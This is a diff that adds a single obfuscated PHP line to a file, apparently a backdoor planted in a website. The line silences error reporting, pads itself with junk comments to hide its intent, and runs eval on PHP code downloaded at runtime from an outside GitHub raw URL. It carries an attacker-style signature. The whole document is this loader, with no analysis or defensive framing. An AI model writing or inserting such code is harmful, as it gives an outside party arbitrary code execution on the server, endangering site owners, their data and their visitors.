@@ -1,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/botot77/botot/refs/heads/main/alpa/post-1420.php"))/******/ /*By Lanciau:v*/?>
